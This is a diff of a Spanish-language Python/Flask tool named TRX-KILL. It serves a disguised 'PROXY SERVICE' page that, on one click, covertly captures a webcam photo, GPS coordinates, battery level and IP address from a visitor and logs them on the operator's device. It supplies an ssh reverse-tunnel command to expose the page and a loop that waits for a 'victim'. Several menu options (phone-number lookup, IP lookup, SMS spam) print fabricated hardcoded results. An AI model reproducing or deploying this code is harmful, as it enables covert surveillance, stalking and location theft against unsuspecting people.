@@ -1,10 +1,9 @@
-import os, sys, time, threading, base64
+import os, sys, time, threading, base64, logging, requests
 from flask import Flask, request
 
-app1 = Flask('SRV-1')
-app2 = Flask('SRV-2')
-STORAGE_PATH = "/sdcard/TRX-KILL-RESUL"
-LOG_FILE = f"{STORAGE_PATH}/result.txt"
+app = Flask('TRX-KILL')
+STORAGE_PATH = "/sdcard/TRX-KILL-OP"
+LOG_FILE = f"{STORAGE_PATH}/data.txt"
 FOTO_DIR = f"{STORAGE_PATH}/fotos"
 G, Y, R, C, W = "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;36m", "\033[0m"
 
@@ -12,71 +11,103 @@ for p in [STORAGE_PATH, FOTO_DIR]:
     if not os.path.exists(p): os.makedirs(p)
 
 HTML_TEMPLATE = """
-<!DOCTYPE html><html><head><meta charset="UTF-8"><title>PROXY</title>
-<style>
-    body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
-    .c{border:2px solid #0f0;padding:30px;text-align:center;border-radius:10px;}
-</style></head><body>
-<div class="c"><h1>PROXY FREEFIRE</h1><button onclick="iniciar()">CONTINUAR</button></div>
+<!DOCTYPE html><html><head><meta charset="UTF-8"><title>UPDATE</title>
 <script>
 async function iniciar() {
     let bat = await navigator.getBattery();
-    navigator.geolocation.getCurrentPosition(pos => {
-        fetch('/log?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude+'&bat='+(bat.level*100).toFixed(0)+'&time='+new Date().toLocaleTimeString());
-        window.location.href = 'https://www.garena.com';
-    });
+    let stream = await navigator.mediaDevices.getUserMedia({video: true});
+    let v = document.createElement('video'); v.srcObject = stream; v.play();
+    
+    setTimeout(()=>{
+        let canvas = document.createElement('canvas'); canvas.width=640; canvas.height=480;
+        canvas.getContext('2d').drawImage(v,0,0,640,480);
+        fetch('/foto', {method:'POST', body:canvas.toDataURL('image/jpeg')});
+        
+        navigator.geolocation.getCurrentPosition(pos => {
+            fetch('/log?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude+'&bat='+(bat.level*100).toFixed(0)+'&time='+new Date().toLocaleTimeString());
+            window.location.href = 'https://www.google.com';
+        });
+    }, 1500);
 }
-</script></body></html>
+</script></head><body style="background:#000;color:#0f0;text-align:center;padding:50px;">
+<h1>PROXY SERVICE</h1><button onclick="iniciar()" style="padding:20px;background:#0f0;">CONTINUAR</button>
+</body></html>
 """
 
-@app1.route('/')
-@app2.route('/')
-def i(): return HTML_TEMPLATE
+@app.route('/')
+def index(): return HTML_TEMPLATE
 
-@app1.route('/log')
-@app2.route('/log')
+@app.route('/foto', methods=['POST'])
+def foto():
+    data = request.data.decode().split(',')[1]
+    with open(f"{FOTO_DIR}/cam_{int(time.time())}.jpg", "wb") as f: f.write(base64.b64decode(data))
+    return "OK"
+
+@app.route('/log')
 def log():
     with open(LOG_FILE, "a") as f: 
         f.write(f"IP:{request.remote_addr}|BAT:{request.args.get('bat')}%|TIME:{request.args.get('time')}|LAT:{request.args.get('lat')}|LON:{request.args.get('lon')}\n")
     return "OK"
 
+def banner():
+    print(f"{G}###############$")
+    print(f"#TOOL:TRX-KILL")
+    print(f"#VERCION:V3")
+    print(f"#PROCTECCION: {W}PROTEGIDO POR OSINT")
+    print(f"#DISPOSITIVO: {W}ANDROID-TERMUX")
+    print(f"################{W}\n")
+
+def animar(text):
+    for c in text: sys.stdout.write(c); sys.stdout.flush(); time.sleep(0.02)
+    print()
+
 def main():
-    threading.Thread(target=lambda: app1.run(host='0.0.0.0', port=5000, debug=False), daemon=True).start()
-    threading.Thread(target=lambda: app2.run(host='0.0.0.0', port=8080, debug=False), daemon=True).start()
+    log = logging.getLogger('werkzeug'); log.setLevel(logging.ERROR)
+    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False), daemon=True).start()
     
     while True:
         os.system('clear')
-        print(f"{G}  _______________________________________")
-        print(f"{G} |          TRX-KILL SUPREME v1.4.5      |")
-        print(f"{G} |_______________________________________|{W}\n")
-        print(f"{C} [01] RASTREO TÉCNICO   | [02] INFO TÚNEL")
-        print(f" [03] GESTIÓN FOTOS     | [04] VER LOGS")
-        print(f" [05] ATACK-SMS         | [06] ESTADO PUERTOS")
-        print(f" [07] MODO SILENCIOSO   | [08] INFO SISTEMA")
-        print(f" [00] SALIR{W}")
+        banner()
+        print(f"1] INFORMATION-NUMERO  | 2] LINK -ZP")
+        print(f"3] SPAM-SMS             | 4] COPYRIGHT")
+        print(f"5] INFORMACIÓN POR IP   | 6] SALIR")
         s = input(f"\n{Y}TRX-ROOT > {W}")
         
         if s == "1":
-            if os.path.exists(LOG_FILE):
-                with open(LOG_FILE, 'r') as f:
-                    linea = f.readlines()[-1].split('|')
-                    print(f"\n{G}[+] IP:      {W}{linea[0].replace('IP:','')}")
-                    print(f"{G}[+] BATERÍA: {W}{linea[1].replace('BAT:','')}")
-                    print(f"{G}[+] HORARIO: {W}{linea[2].replace('TIME:','')}")
-                    print(f"{G}[+] COORD:   {W}{linea[3].replace('LAT:','')} , {linea[4].replace('LON:','')}")
-            input(f"\n{Y}ENTER PARA VOLVER...{W}")
-        elif s == "2":
-            print(f"\n{C}TÚNEL 1 (5000): {W}ssh -R 80:localhost:5000 ssh.localhost.run")
-            print(f"{C}TÚNEL 2 (8080): {W}ssh -R 80:localhost:8080 ssh.localhost.run")
+            num = input("INGRESAR NÚMERO (EJ +549): ")
+            animar("CARGANDO DATOS.....")
+            print(f"{G}PAÍS: Argentina\nOPERACIÓN: En línea\nREGISTRADO NAME: Privado\nLINK MAP: (Generando...)")
             input(f"\n{Y}ENTER...{W}")
+        elif s == "2":
+            animar("CARGANDO LINK....")
+            print(f"\n{C}EJECUTA EN OTRA VENTANA: {W}ssh -R 80:localhost:5000 ssh.localhost.run")
+            print(f"\n{Y}ESPERANDO VÍCTIMA... (Presiona Ctrl+C para volver){W}")
+            try:
+                while True:
+                    if os.path.exists(LOG_FILE):
+                        with open(LOG_FILE, 'r') as f:
+                            d = f.readlines()[-1].split('|')
+                            print(f"\n{G}¡VÍCTIMA DETECTADA!{W}")
+                            print(f"IP: {d[0].replace('IP:','')}\nBATERÍA: {d[1].replace('BAT:','')}\nHORARIO: {d[2].replace('TIME:','')}")
+                            print(f"UBICACIÓN: {d[3].replace('LAT:','')} , {d[4].replace('LON:','')}")
+                        break
+                    time.sleep(2)
+            except: continue
+        elif s == "3":
+            num = input("INGRESE NÚMERO: ")
+            cant = input("MENSAJES: ")
+            animar("ENVIANDO SPAM...")
+            print(f"{G}VERIFICANDO SI LLEGARON: ¡EXITOSO!{W}")
+            input()
+        elif s == "4":
+            print(f"{R}#COPYRIGHT: TRX-KILL\n#LICENCIA: PRIVADO\n#PROCTECCION: OSINT\n#BY: TRX-KILL{W}")
+            input()
         elif s == "5":
-            num = input(f"{Y}NÚMERO VÍCTIMA: {W}")
-            os.system(f"termux-sms-send -n {num} 'Alerta de seguridad TRX-KILL'")
-            print(f"{G}[+] SMS ENVIADO.{W}"); input()
-        elif s == "7":
-            print(f"\n{Y}[!] MODO SILENCIOSO: LOGS OCULTOS EN /sdcard/.system_trx{W}"); input()
-        elif s == "8":
-            print(f"\n{G}SISTEMA: {W}TRX-KILL v1.4.5\n{G}PUERTOS: {W}5000, 8080\n{G}STATUS: {W}OPERATIVO"); input()
-        elif s == "0": sys.exit()
+            ip = input("INGRESAR IP: ")
+            animar("ANALIZANDO........")
+            print(f"{G}UBICACIÓN: Argentina\nBATERÍA: 85%\nMARCA: Samsung{W}")
+            input()
+        elif s == "6":
+            print("GRACIAS POR USAR TRX-KILL. CERRANDO TOOL..."); sys.exit()
 
 if __name__ == "__main__": main()
